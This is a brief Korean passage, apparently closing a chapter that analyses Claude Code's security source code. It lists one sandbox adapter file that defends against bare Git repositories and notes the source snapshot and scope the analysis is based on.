| `utils/sandbox/sandbox-adapter.ts` | 985 | 샌드박스 설정 어댑터, 裸 Git 저장소 방어 |

---

*이 장의 분석은 Claude Code TypeScript 소스 코드 스냅샷(2026-03-31, ~512K LOC)을 기반으로 한다. 보안 관련 코드는 약 25,000줄으로 16개 핵심 파일을 커버한다. 모든 코드 조각은 소스 파일에서 정확히 복사되었으며 위치가 표시되어 있다.*
